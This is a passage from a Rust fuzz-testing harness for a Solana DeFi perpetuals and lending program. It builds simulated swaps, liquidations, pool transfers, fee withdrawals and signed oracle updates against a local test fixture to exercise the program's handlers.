    /// action makes `cumulative_deposit_interest` able to DECREASE, which that
    /// check previously (and wrongly) asserted was impossible.
    pub fn action_resolve_spot_bankruptcy(
        &mut self,
        #[range(0..NUM_USERS)] victim_idx: usize,
        #[range(0..NUM_USERS)] liq_idx: usize,
        #[range(0..2u16)] market_index: u16,
    ) -> bool {
        let victim = self.users[victim_idx].clone();
        let liq = self.users[(liq_idx + 1) % NUM_USERS].clone();
        if liq.user_pda == victim.user_pda {
            return false; // UserCantLiquidateThemself
        }
        let accounts = self.resolve_accounts(&liq, &victim, market_index);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_RESOLVE_SPOT_BANKRUPTCY, &market_index.to_le_bytes()),
            })
            .signers(&[&liq.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `resolve_perp_bankruptcy(quote_spot_market_index, market_index)` — the perp
    /// waterfall: the `pending_if_fee` tranche, the shared IF vault draw, the AMM
    /// fee-provision clawback, then socialization via the cumulative-funding-rate
    /// bump.
    ///
    /// `quote_spot_market_index` is fixed at 0: the vault seeds in
    /// `ResolveBankruptcy` derive from it, and perp pnl is quote-denominated.
    pub fn action_resolve_perp_bankruptcy(
        &mut self,
        #[range(0..NUM_USERS)] victim_idx: usize,
        #[range(0..NUM_USERS)] liq_idx: usize,
    ) -> bool {
        let victim = self.users[victim_idx].clone();
        let liq = self.users[(liq_idx + 1) % NUM_USERS].clone();
        if liq.user_pda == victim.user_pda {
            return false;
        }
        let accounts = self.resolve_accounts(&liq, &victim, 0);
        let mut args = 0u16.to_le_bytes().to_vec(); // quote_spot_market_index
        args.extend_from_slice(&0u16.to_le_bytes()); // perp market_index
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_RESOLVE_PERP_BANKRUPTCY, &args),
            })
            .signers(&[&liq.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    pub fn action_swap(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u16)] in_market_index: u16,
        #[range(0..2u16)] out_market_index: u16,
        #[range(1..1_000_000_000u64)] amount_in: u64,
        #[range(1..1_000_000_000u64)] amount_out: u64,
        #[range(0..2u8)] with_limit_price: u8,
        #[range(1..10_000_000u64)] limit_price: u64,
        #[range(0..3u8)] reduce_only: u8,
    ) -> bool {
        if in_market_index == out_market_index {
            return false; // the protocol rejects a same-market swap outright
        }
        let user = self.users[user_idx].clone();
        let (_in_m, in_vault, _, in_token) = self.spot_of(in_market_index, &user);
        let (_out_m, out_vault, _, out_token) = self.spot_of(out_market_index, &user);

        let swap_accounts = |extra: Vec<AccountMeta>| {
            let mut a = vec![
                AccountMeta::new_readonly(self.state_pda(), false),
                AccountMeta::new(user.user_pda, false),
                AccountMeta::new(user.stats_pda, false),
                AccountMeta::new_readonly(user.keypair.pubkey(), true),
                AccountMeta::new(out_vault, false),
                AccountMeta::new(in_vault, false),
                AccountMeta::new(out_token, false),
                AccountMeta::new(in_token, false),
                AccountMeta::new_readonly(token_program_id(), false),
                AccountMeta::new_readonly(self.signer_pda, false),
                AccountMeta::new_readonly(instructions_sysvar_id(), false),
            ];
            a.extend(extra);
            a
        };

        let mut begin_args = in_market_index.to_le_bytes().to_vec();
        begin_args.extend_from_slice(&out_market_index.to_le_bytes());
        begin_args.extend_from_slice(&amount_in.to_le_bytes());

        let mut end_args = in_market_index.to_le_bytes().to_vec();
        end_args.extend_from_slice(&out_market_index.to_le_bytes());
        push_opt(
            &mut end_args,
            with_limit_price == 1,
            &limit_price.to_le_bytes(),
        );
        // Option<SwapReduceOnly>: 0 = None, else Some(In|Out)
        push_opt_u8(
            &mut end_args,
            reduce_only > 0,
            reduce_only.saturating_sub(1),
        );

        let ras = self.market_ras(true);
        let begin = Instruction {
            program_id: self.program_id,
            accounts: swap_accounts(ras.clone()),
            data: ix_data(D_BEGIN_SWAP, &begin_args),
        };
        let end = Instruction {
            program_id: self.program_id,
            accounts: swap_accounts(ras),
            data: ix_data(D_END_SWAP, &end_args),
        };

        // The external swap leg: a counterparty credits the swapper's OUT token
        // account, which is what `end_swap` measures as `amount_out`.
        let counterparty = self.users[(user_idx + 1) % NUM_USERS].clone();
        let (_m, _v, _if, cp_out_token) = self.spot_of(out_market_index, &counterparty);
        let fill = spl_transfer_ix(
            cp_out_token,
            out_token,
            counterparty.keypair.pubkey(),
            amount_out,
        );

        if self
            .ctx
            .raw_call(begin)
            .signers(&[&user.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(fill)
            .signers(&[&counterparty.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(end)
            .signers(&[&user.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        self.ctx
            .send_batch()
            .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
            .unwrap_or(false)
    }

    /// `liquidate_spot_with_swap_begin` + `..._end`, batched into one
    /// transaction (same bracketing requirement as `action_swap`).
    pub fn action_liquidate_spot_with_swap(
        &mut self,
        #[range(0..NUM_USERS)] victim_idx: usize,
        #[range(0..NUM_USERS)] liq_idx: usize,
        #[range(0..2u16)] asset_market_index: u16,
        #[range(0..2u16)] liability_market_index: u16,
        #[range(1..1_000_000_000u64)] swap_amount: u64,
        #[range(0..2u8)] setup: u8,
    ) -> bool {
        // COMPOUND: build a genuinely underwater victim.
        //
        // `_begin` runs the full liquidation margin calculation and bails with
        // `SufficientCollateral` on a healthy account, and `_end` additionally
        // requires `asset_spot_market.flash_loan_amount != 0` — a value only
        // `_begin` sets. So if `_begin` never gets past the margin check, `_end`
        // can only ever reach its own guard, which is why it sat at 2.9% while
        // `_begin` sat at 47.9%.
        //
        // Borrow market 1 to the initial-margin limit, then walk its oracle up
        // in sub-1% steps until maintenance breaks (initial 1.2x -> maintenance
        // 1.1x is ~9%, so ~12 steps). Every intermediate state is one the
        // protocol could really be in: the borrow is legal and it is the price
        // move that breaks it.
        if setup == 1 {
            let _ = self.action_deposit(victim_idx, 500 * QUOTE_PRECISION as u64, 0, 0);
            let _ =
                self.action_deposit((victim_idx + 1) % NUM_USERS, 900 * BASE_PRECISION_U64, 1, 0);
            let _ = self.action_borrow_to_margin_limit(victim_idx, 100);
            for _ in 0..14 {
                let _ = self.action_move_spot_1_oracle_price(1, 99, 0, 0, 0);
            }
        }
        let victim = self.users[victim_idx].clone();
        let liq = self.users[(liq_idx + 1) % NUM_USERS].clone();
        let (_a_m, asset_vault, _, asset_token) = self.spot_of(asset_market_index, &liq);
        let (_l_m, liab_vault, _, liab_token) = self.spot_of(liability_market_index, &liq);

        let accounts = |extra: Vec<AccountMeta>| {
            let mut a = vec![
                AccountMeta::new_readonly(self.state_pda(), false),
                AccountMeta::new_readonly(liq.keypair.pubkey(), true),
                AccountMeta::new(liq.user_pda, false),
                AccountMeta::new(victim.user_pda, false),
                AccountMeta::new(liab_vault, false),
                AccountMeta::new(asset_vault, false),
                AccountMeta::new(liab_token, false),
                AccountMeta::new(asset_token, false),
                AccountMeta::new_readonly(token_program_id(), false),
                AccountMeta::new_readonly(self.signer_pda, false),
                AccountMeta::new_readonly(instructions_sysvar_id(), false),
            ];
            a.extend(extra);
            a
        };

        let mut begin_args = asset_market_index.to_le_bytes().to_vec();
        begin_args.extend_from_slice(&liability_market_index.to_le_bytes());
        begin_args.extend_from_slice(&swap_amount.to_le_bytes());
        let mut end_args = asset_market_index.to_le_bytes().to_vec();
        end_args.extend_from_slice(&liability_market_index.to_le_bytes());

        let ras = self.market_ras(true);
        let begin = Instruction {
            program_id: self.program_id,
            accounts: accounts(ras.clone()),
            data: ix_data(D_LIQUIDATE_SPOT_WITH_SWAP_BEGIN, &begin_args),
        };
        let end = Instruction {
            program_id: self.program_id,
            accounts: accounts(ras),
            data: ix_data(D_LIQUIDATE_SPOT_WITH_SWAP_END, &end_args),
        };
        // The liquidator must DELIVER liability tokens between begin and end —
        // begin hands them the seized asset, end expects the liability repaid.
        // Without this leg `..._end` can only ever hit its rejection branch.
        let counterparty = self.users[(liq_idx + 2) % NUM_USERS].clone();
        let (_m2, _v2, _i2, cp_liab_token) = self.spot_of(liability_market_index, &counterparty);
        let fill = spl_transfer_ix(
            cp_liab_token,
            liab_token,
            counterparty.keypair.pubkey(),
            swap_amount,
        );

        if self
            .ctx
            .raw_call(begin)
            .signers(&[&liq.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(fill)
            .signers(&[&counterparty.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(end)
            .signers(&[&liq.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        self.ctx
            .send_batch()
            .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
            .unwrap_or(false)
    }

    /// `transfer_pools(...)` — migrate a user's deposits AND borrows between two
    /// pools in one instruction. Needs four vaults, so it only becomes meaningful
    /// with two spot markets.
    #[allow(clippy::too_many_arguments)]
    pub fn action_transfer_pools(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..4u16)] sub_account_id: u16,
        // Which mint carries the DEPOSIT leg: 0 = USDC (markets 0 <-> 2),
        // 1 = SOL (markets 1 <-> 3). The borrow leg takes the other mint, which
        // is what keeps all four vault slots distinct — anchor rejects the same
        // mutable account twice, and that rejection never reaches the program.
        #[range(0..2u16)] deposit_leg: u16,
        // Bit 0 flips the deposit leg's direction, bit 1 the borrow leg's.
        // Variant 0 is the canonical pool-0 -> pool-1 migration (the one that can
        // succeed); the other three cross the legs across pools, so they reach
        // the handler and trip its pool-id validates
        // (instructions/user.rs:1648-1664) rather than dying in anchor.
        #[range(0..4u8)] leg_variant: u8,
        #[range(0..2u8)] with_deposit_amount: u8,
        #[range(1..1_000_000_000u64)] deposit_amount: u64,
        #[range(0..2u8)] with_borrow_amount: u8,
        #[range(1..1_000_000_000u64)] borrow_amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (sub_pda, _) = Pubkey::find_program_address(
            &[
                b"user",
                user.keypair.pubkey().as_ref(),
                &sub_account_id.to_le_bytes(),
            ],
            &self.program_id,
        );
        // Copy the vault pubkeys out before the &mut self compound calls below.
        let (v0, v1, v2, v3) = (
            self.spot_vault_pda,
            self.spot_vault_1_pda,
            self.pool1_vault_a_pda,
            self.pool1_vault_b_pda,
        );
        let vault_of = move |mi: u16| match mi {
            1 => v1,
            2 => v2,
            3 => v3,
            _ => v0,
        };
        // COMPOUND: `transfer_pools` needs the destination sub-account to be in a
        // DIFFERENT pool (`from_user.pool_id != to_user.pool_id`), so put it in
        // pool 1 first. Idempotent — a repeat call just fails harmlessly.
        let _ = self.action_initialize_sub_account(user_idx, sub_account_id);
        let _ =
            self.send_user_setter_for(user_idx, sub_account_id, D_UPDATE_USER_POOL_ID, vec![1u8]);

        // All FOUR vault slots must be distinct accounts (anchor rejects the
        // same mutable account twice), and the legs must cross pools: deposit
        // 0 -> 2 and borrow 1 -> 3 maps pool 0 onto pool 1.
        //
        // WAS: four `#[range(0..2u16)]` market-index params SHADOWED right here
        // by hard-coded `(0, 2)` / `(1, 3)` — four fuzz dimensions drawn and
        // discarded on every call, against a range that could not reach markets
        // 2/3 in the first place. Derived from the two live params instead, which
        // keeps the mint pairing (and therefore vault distinctness) an invariant
        // of the construction rather than something the fuzzer has to guess.
        let (d_lo, b_lo) = if deposit_leg == 0 {
            (0u16, 1u16)
        } else {
            (1u16, 0u16)
        };
        let (deposit_from, deposit_to) = if leg_variant & 1 == 0 {
            (d_lo, d_lo + 2)
        } else {
            (d_lo + 2, d_lo)
        };
        let (borrow_from, borrow_to) = if leg_variant & 2 == 0 {
            (b_lo, b_lo + 2)
        } else {
            (b_lo + 2, b_lo)
        };
        let mut args = deposit_from.to_le_bytes().to_vec();
        args.extend_from_slice(&deposit_to.to_le_bytes());
        args.extend_from_slice(&borrow_from.to_le_bytes());
        args.extend_from_slice(&borrow_to.to_le_bytes());
        push_opt(
            &mut args,
            with_deposit_amount == 1,
            &deposit_amount.to_le_bytes(),
        );
        push_opt(
            &mut args,
            with_borrow_amount == 1,
            &borrow_amount.to_le_bytes(),
        );
        let mut accounts = vec![
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(sub_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(vault_of(deposit_from), false),
            AccountMeta::new(vault_of(deposit_to), false),
            AccountMeta::new(vault_of(borrow_from), false),
            AccountMeta::new(vault_of(borrow_to), false),
            AccountMeta::new_readonly(self.signer_pda, false),
        ];
        // Its own remaining-account set: all four spot markets plus the oracles.
        // `market_ras` covers only markets 0/1, which is right for the other 88
        // handlers — widening it globally would push every instruction's account
        // list up for no reason.
        accounts.push(AccountMeta::new(self.perp_oracle_pda, false));
        accounts.push(AccountMeta::new(self.spot_1_oracle_pda, false));
        accounts.push(AccountMeta::new(self.spot_market_pda, false));
        accounts.push(AccountMeta::new(self.spot_market_1_pda, false));
        accounts.push(AccountMeta::new(self.pool1_market_a_pda, false));
        accounts.push(AccountMeta::new(self.pool1_market_b_pda, false));
        accounts.push(AccountMeta::new(self.perp_market_pda, false));

        let ix = Instruction {
            program_id: self.program_id,
            accounts,
            data: ix_data(D_TRANSFER_POOLS, &args),
        };
        if self
            .ctx
            .raw_call(compute_budget_ix(1_400_000))
            .signers(&[&user.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(ix)
            .signers(&[&user.keypair])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        self.ctx
            .send_batch()
            .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
            .unwrap_or(false)
    }

    // ---- isolated perp positions ------------------------------------------
    //
    // An isolated position carries its own collateral instead of drawing on the
    // cross-margin pool, so these move money between the user's spot balance and
    // a per-position bucket. Gated behind the `isolated-position` feature, which
    // the devnet .so this harness loads has enabled.

    /// `deposit_into_isolated_perp_position(spot_market_index, perp_market_index, amount)`.
    pub fn action_deposit_into_isolated(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u16)] spot_market_index: u16,
        #[range(1..1_000_000_000_000u64)] amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (_m, vault, _if, token_account) = self.spot_of(spot_market_index, &user);
        let mut args = spot_market_index.to_le_bytes().to_vec();
        args.extend_from_slice(&0u16.to_le_bytes()); // perp_market_index
        args.extend_from_slice(&amount.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_DEPOSIT_INTO_ISOLATED, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `withdraw_from_isolated_perp_position(spot_market_index, perp_market_index, amount)`.
    pub fn action_withdraw_from_isolated(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u16)] spot_market_index: u16,
        #[range(1..1_000_000_000_000u64)] amount: u64,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (_m, vault, _if, token_account) = self.spot_of(spot_market_index, &user);
        let mut args = spot_market_index.to_le_bytes().to_vec();
        args.extend_from_slice(&0u16.to_le_bytes());
        args.extend_from_slice(&amount.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(self.signer_pda, false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_WITHDRAW_FROM_ISOLATED, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `transfer_isolated_perp_position_deposit(spot_market_index)` — move an
    /// isolated position's collateral back into the cross-margin pool.
    pub fn action_transfer_isolated_deposit(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u16)] spot_market_index: u16,
        #[range(0..2u8)] direction: u8,
        #[range(1..2_000_000u64)] amount: u64,
    ) -> bool {
        // COMPOUND: an isolated position must exist and hold collateral before
        // it can be transferred back to cross margin. Seed it here rather than
        // hoping the fuzzer emits deposit_into_isolated immediately before.
        let _ = self.action_deposit_into_isolated(user_idx, spot_market_index, 1_000_000);
        let user = self.users[user_idx].clone();
        let (_m, vault, _if, _tok) = self.spot_of(spot_market_index, &user);
        let mut accounts = vec![
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(vault, false),
        ];
        accounts.extend(self.market_ras(true));
        // Three args, not one: `(spot_market_index, perp_market_index, amount)`.
        // Encoding only the first left the ix data 10 bytes short, so anchor
        // rejected it during deserialization and the handler body was never
        // entered — which is why this read 13%.
        //
        // `amount` is SIGNED and that sign is the whole instruction: positive
        // moves collateral cross -> isolated, negative moves it back.
        let mut args = spot_market_index.to_le_bytes().to_vec();
        args.extend_from_slice(&0u16.to_le_bytes()); // perp market 0 is the only one
        let signed = if direction == 0 {
            amount as i64
        } else {
            -(amount as i64)
        };
        args.extend_from_slice(&signed.to_le_bytes());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRANSFER_ISOLATED_DEPOSIT, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- protocol fee withdrawal ------------------------------------------
    //
    // Guarded by `check_hot(.., HotRole::FeeWithdraw)`; the fixture registers the
    // crank for every hot role, so the authority check now passes and the
    // handler body is reachable. The recipient's ATA is derived and created by
    // the instruction itself (associated-token program in the account list).

    fn ata(&self, owner: &Pubkey, mint: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(
            &[owner.as_ref(), token_program_id().as_ref(), mint.as_ref()],
            &Pubkey::from_str_const("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
        )
        .0
    }

    /// `withdraw_protocol_fees_spot(market_index, amount)`.
    pub fn action_withdraw_protocol_fees_spot(
        &mut self,
        #[range(0..2u16)] market_index: u16,
        #[range(1..1_000_000_000u64)] amount: u64,
    ) -> bool {
        // COMPOUND: fill the pool first.
        //
        // The handler withdraws from `spot_market.protocol_fee_pool` and rejects
        // with `InsufficientProtocolFees` when it is empty. NOTE the pool: the
        // perp sweep credits `perp_market.protocol_fee_pool`, a different field
        // that `withdraw_protocol_fees_perp` reads — sweeping does nothing for
        // the spot side. The spot pool's only source is the protocol's cut of
        // BORROW INTEREST, taken inside
        // `update_spot_market_cumulative_interest`. So it needs real
        // utilization plus elapsed time; with neither, the cut is zero forever.
        //
        // Borrow on both markets (each user posts the other market's asset as
        // collateral), let time pass, then crank interest so the cut lands.
        let _ = self.action_borrow_to_margin_limit(0, 90);
        let _ = self.action_deposit(1, 100 * BASE_PRECISION_U64, 1, 0);
        let _ = self.action_update_user_margin_trading_enabled(1, 1);
        let _ = self.action_withdraw(1, 50 * QUOTE_PRECISION as u64, 0, 0);
        let _ = self.action_warp(4_000, 1);
        let _ = self.action_update_spot_market_cumulative_interest();
        let crank = self.crank.clone();
        let user = self.users[0].clone();
        let (spot_market, vault, _if, _tok) = self.spot_of(market_index, &user);
        let mint = if market_index == 1 {
            self.sol_mint
        } else {
            self.usdc_mint
        };
        let recipient = crank.pubkey();
        let recipient_ata = self.ata(&recipient, &mint);
        let mut args = market_index.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(crank.pubkey(), true), // payer
                    AccountMeta::new_readonly(crank.pubkey(), true), // authority (hot fee-withdraw)
                    AccountMeta::new(spot_market, false),
                    AccountMeta::new(vault, false),
                    AccountMeta::new_readonly(mint, false),
                    AccountMeta::new_readonly(recipient, false),
                    AccountMeta::new(recipient_ata, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new_readonly(system_program_id(), false),
                    AccountMeta::new_readonly(
                        Pubkey::from_str_const("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
                        false,
                    ),
                ],
                data: ix_data(D_WITHDRAW_PROTOCOL_FEES_SPOT, &args),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `withdraw_protocol_fees_perp(market_index, amount)` — same shape, plus the
    /// perp market and its quote spot market.
    pub fn action_withdraw_protocol_fees_perp(
        &mut self,
        #[range(1..1_000_000_000u64)] amount: u64,
    ) -> bool {
        let crank = self.crank.clone();
        let mint = self.usdc_mint;
        let recipient = crank.pubkey();
        let recipient_ata = self.ata(&recipient, &mint);
        let mut args = 0u16.to_le_bytes().to_vec();
        args.extend_from_slice(&amount.to_le_bytes());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(crank.pubkey(), true),
                    AccountMeta::new_readonly(crank.pubkey(), true),
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new(self.spot_market_pda, false),
                    AccountMeta::new(self.spot_vault_pda, false),
                    AccountMeta::new_readonly(mint, false),
                    AccountMeta::new_readonly(recipient, false),
                    AccountMeta::new(recipient_ata, false),
                    AccountMeta::new_readonly(token_program_id(), false),
                    AccountMeta::new_readonly(self.signer_pda, false),
                    AccountMeta::new_readonly(system_program_id(), false),
                    AccountMeta::new_readonly(
                        Pubkey::from_str_const("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
                        false,
                    ),
                ],
                data: ix_data(D_WITHDRAW_PROTOCOL_FEES_PERP, &args),
            })
            .signers(&[&crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- signed-message + revenue-share account lifecycle -----------------
    //
    // These are the account create/resize/delete halves of two subsystems the
    // harness previously could not touch at all. The ORDER-placing signed-msg
    // instructions additionally need an ed25519 pre-instruction, which
    // `build_signed_msg_envelope` + `ed25519_verify_ix` now supply.

    fn signed_msg_orders_pda(&self, authority: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(&[b"SIGNED_MSG", authority.as_ref()], &self.program_id).0
    }
    fn signed_msg_ws_pda(&self, authority: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(&[b"SIGNED_MSG_WS", authority.as_ref()], &self.program_id).0
    }
    fn revenue_share_pda(&self, authority: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(&[b"REV_SHARE", authority.as_ref()], &self.program_id).0
    }
    fn revenue_escrow_pda(&self, authority: &Pubkey) -> Pubkey {
        Pubkey::find_program_address(&[b"REV_ESCROW", authority.as_ref()], &self.program_id).0
    }

    /// `initialize_signed_msg_user_orders(num_orders)`.
    pub fn action_init_signed_msg_user_orders(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..33u16)] num_orders: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.signed_msg_orders_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.keypair.pubkey(), true), // payer
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INIT_SIGNED_MSG_USER_ORDERS, &num_orders.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `resize_signed_msg_user_orders(num_orders)` — grows/shrinks the ring.
    pub fn action_resize_signed_msg_user_orders(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..65u16)] num_orders: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.signed_msg_orders_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_RESIZE_SIGNED_MSG_USER_ORDERS, &num_orders.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `delete_signed_msg_user_orders`.
    pub fn action_delete_signed_msg_user_orders(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.signed_msg_orders_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new(self.state_pda(), false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                ],
                data: ix_data(D_DELETE_SIGNED_MSG_USER_ORDERS, &[]),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `update_pyth_lazer_oracle` — the REAL signed oracle-update path.
    ///
    /// `action_move_oracle_price` rewrites the oracle account host-side, which
    /// is fast but bypasses the entire ingestion instruction: message parsing,
    /// the trusted-signer check, the monotonic-timestamp and wall-clock
    /// staleness guards, and the confidence derivation (which takes the *widest*
    /// of a 20bps floor, the bid/ask spread, and the signed `Confidence`
    /// property). This drives that instruction properly.
    ///
    /// Batched as `[ed25519_verify, update_pyth_lazer_oracle]`, same shape as
    /// the signed-msg orders — but note the envelope differs: a Lazer
    /// `SolanaMessage` carries a 4-byte format magic *before* the signature, so
    /// every offset shifts by 4 and the payload is raw LE, not hex.
    pub fn action_post_pyth_lazer_update(
        &mut self,
        #[range(0..2u8)] which_feed: u8,
        #[range(0..2u8)] up: u8,
        // Up to 2% per step. Small enough that every intermediate state is one
        // the protocol could really be in, large enough that a handful of steps
        // crosses a maintenance-margin boundary instead of needing dozens.
        #[range(0..200u64)] bps: u64,
        #[range(0..2u8)] with_confidence: u8,
        #[range(0..1_000_000i64)] confidence: i64,
        #[range(0..2u8)] with_bid_ask: u8,
        #[range(0..3u8)] ts_mode: u8,
    ) -> bool {
        use pyth_lazer::{
            message::SolanaMessage,
            payload::{PayloadData, PayloadFeedData, PayloadPropertyValue},
            price::Price,
            time::TimestampUs,
            ChannelId, PriceFeedId,
        };

        let (feed_id, oracle_pda) = if which_feed == 0 {
            (PERP_FEED_ID, self.perp_oracle_pda)
        } else {
            (SPOT_1_FEED_ID, self.spot_1_oracle_pda)
        };

        // Step the price relative to whatever the oracle currently holds, same
        // sub-1% envelope the host-side poke uses.
        let (current, cached_publish_time) =
            match read_zc::<PythLazerOracle>(&self.ctx, &oracle_pda) {
                Some(o) => (o.price.max(1), o.publish_time),
                None => return false,
            };
        let delta = (current as i128 * bps as i128 / 10_000).max(if bps > 0 { 1 } else { 0 });
        let next = if up == 1 {
            (current as i128).saturating_add(delta)
        } else {
            (current as i128).saturating_sub(delta)
        }
        .max(1) as i64;

        let clock: anchor_lang::prelude::Clock = self.ctx.svm.get_sysvar();
        // `ts_mode` walks the three timestamp outcomes the handler distinguishes:
        // fresh (accepted), far in the past (rejected by the wall-clock staleness
        // guard), and behind the cached publish_time (rejected as non-monotonic).
        //
        // The fresh case takes the MAX of wall-clock and "one microsecond past
        // what the oracle already has": LiteSVM starts `unix_timestamp` at 0, so
        // a naive `now` would be behind the injected `publish_time` and every
        // update would bounce off the monotonicity guard before reaching the
        // price-writing code — which is exactly the branch worth covering.
        let now_us = (clock.unix_timestamp.max(0) as u64).saturating_mul(1_000_000);
        let timestamp_us = match ts_mode {
            0 => now_us.max(cached_publish_time.saturating_add(1)),
            1 => now_us.saturating_sub(3_600 * 1_000_000),
            _ => 0,
        };

        let mut properties = vec![
            // properties[0] MUST be Price(Some(..)) or the handler errors out.
            PayloadPropertyValue::Price(Price::from_integer(next, 0).ok()),
            PayloadPropertyValue::Exponent(-6),
            PayloadPropertyValue::FeedUpdateTimestamp(Some(TimestampUs::from_micros(timestamp_us))),
        ];
        if with_bid_ask == 1 {
            properties.push(PayloadPropertyValue::BestBidPrice(
                Price::from_integer(next.saturating_sub(next / 1_000).max(1), 0).ok(),
            ));
            properties.push(PayloadPropertyValue::BestAskPrice(
                Price::from_integer(next.saturating_add(next / 1_000), 0).ok(),
            ));
        }
        if with_confidence == 1 {
            properties.push(PayloadPropertyValue::Confidence(
                Price::from_integer(confidence.max(1), 0).ok(),
            ));
        }

        let payload = PayloadData {
            timestamp_us: TimestampUs::from_micros(timestamp_us),
            channel_id: ChannelId::FIXED_RATE_200,
            feeds: vec![PayloadFeedData {
